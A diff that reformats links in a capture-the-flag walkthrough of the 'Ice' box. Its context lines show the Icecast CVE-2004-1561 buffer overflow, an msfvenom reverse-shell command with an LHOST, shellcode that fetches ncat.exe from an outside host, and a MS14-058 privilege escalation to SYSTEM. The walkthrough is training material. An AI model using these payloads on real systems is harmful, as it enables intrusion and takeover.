@@ -61,7 +61,7 @@ icecast server 1.3.12 - Directory Traversal Information Disclosure              
 Shellcodes: No Results
 ```
 
-The 'Icecast 2.0.1 (Win32) - Remote Code Execution' exploits are the  most interesting two options here. A little bit of Googling leads us to  the following webpage: https://www.exploit-db.com/exploits/568
+The 'Icecast 2.0.1 (Win32) - Remote Code Execution' exploits are the  most interesting two options here. A little bit of Googling leads us to  the following webpage: <https://www.exploit-db.com/exploits/568>
 This relates to the this CVE: **CVE-2004-1561**
 
 ## Initial Exploitation
@@ -99,11 +99,11 @@ char shellcode[] = "xEB"
 Here we are basically feeding a sequence of 31 empty headers (the  "arn") to Icecast to take up the first 31 locations in the buffer. 
 Then we use the "xcc" which is a null byte to signify we'd like to execute what follows. 
 This takes up the whole 32 bit buffer and any code we pass past this point will be taken as a part of a 'return' statement. 
-Unfortunately we can see here that the shell is attempting to download a binary from http://www.elitehaven.net/ncat.exe which is a location that no longer exists. 
+Unfortunately we can see here that the shell is attempting to download a binary from <http://www.elitehaven.net/ncat.exe> which is a location that no longer exists. 
 Therefore this shell code will not work. But it gives us a nice idea of what we can do from here.
 
 ### Icecast.py
-After some more looking around for a working exploit, we find the following: https://github.com/ivanitlearning/CVE-2004-1561
+After some more looking around for a working exploit, we find the following: <https://github.com/ivanitlearning/CVE-2004-1561>
 We can see that the author ivanitlearning (who is a legend) rewrote both the original C version of the exploit as well as writing a Python version. 
 In this case we'll be using the Python version which is called **Icecast.py**
 The usage is fairly simple. ivanitlearning recommends the following:
@@ -268,7 +268,7 @@ We've got a shell as the user Dark!
 
 ### Privilege Escalation
 Now that we have a shell we have a number of ways of trying to identify valid pathways for privilege escalation. 
-This time we're going to use the Windows Exploit Suggester. It's available here: https://github.com/AonCyberLabs/Windows-Exploit-Suggester
+This time we're going to use the Windows Exploit Suggester. It's available here: <https://github.com/AonCyberLabs/Windows-Exploit-Suggester>
 
 We needed to install pip for python2 and install the xlrd module before it would run: 
 
@@ -366,7 +366,7 @@ We do not include all the output as there are quite a number of local vulnerabil
 ```
 
 The exploit doesn't seem to directly relate to our needs but if we Google MS14-058 we can find this GitHub repository:
-https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS14-058
+<https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS14-058>
 
 It appears that by using the Win64.exe executable found at the repository, as long as we can get it onto the box, we should be able to run commands as NT AUTHORITY\SYSTEM (root). For example:
 
@@ -386,7 +386,7 @@ msfvenom -a x86 --platform Windows -p windows/shell_reverse_tcp LHOST=10.4.18.56
 The only things we change here from the previous shell is to use a different port ```LPORT=421``` and ```-f exe``` to ensure we get an executable as the output. ```-o paperboy.exe``` outputs the shell a file with the name 'paperboy.exe'.
 
 Once we've done this we can grab the archive for the MS14-058 exploit from:
-https://github.com/SecWiki/windows-kernel-exploits/blob/master/MS14-058/CVE-2014-4113-Exploit.rar
+<https://github.com/SecWiki/windows-kernel-exploits/blob/master/MS14-058/CVE-2014-4113-Exploit.rar>
 
 We can extract this archive and grab Win64.exe from it. We move the paperboy.exe reverse shell and the Win64.exe file to a folder. Next we want to upload the files to the box. 
 
@@ -411,7 +411,7 @@ CertUtil: -URLCache command completed successfully.
 ```
 
 ###### With smbserver.py
-First we can copy smbserver.py from https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbserver.py into our directory with the paperboy.exe and Win64.exe executables:
+First we can copy smbserver.py from <https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbserver.py> into our directory with the paperboy.exe and Win64.exe executables:
 
 ```
 cp /opt/impacket/examples/smbserver.py ~/Boxes/Ice/share
@@ -519,8 +519,13 @@ nt authority\system
 This was a fun box to learn how to exploit manually and is a great test case for learning about a very simple buffer overflow.
 
 Thanks to the following for their work in creating some of the tools used and guiding me on their usage:
-* HackerSploit for their Ice Manual Exploitation video - https://www.youtube.com/watch?v=eIy69zUfbgI
-* Gitmaninc for the Win64.exe exploit code - https://github.com/Gitmaninc
-* Luigi Auriemma for the original exploit - http://aluigi.altervista.org/adv/iceexec-adv.txt
+* HackerSploit for their Ice Manual Exploitation video - <https://www.youtube.com/watch?v=eIy69zUfbgI>
+* Gitmaninc for the Win64.exe exploit code - <https://github.com/Gitmaninc>
+* Luigi Auriemma for the original exploit - <http://aluigi.altervista.org/adv/iceexec-adv.txt>
+* SecWiki for their Windows Kernel Exploits - <https://github.com/SecWiki/>
+* SecureAuthCorp for Impacket - <https://github.com/SecureAuthCorp/>
+* AonCyberLabs for the Windows Exploit Suggester - <https://github.com/AonCyberLabs/Windows-Exploit-Suggester>
+  
+  
 
 
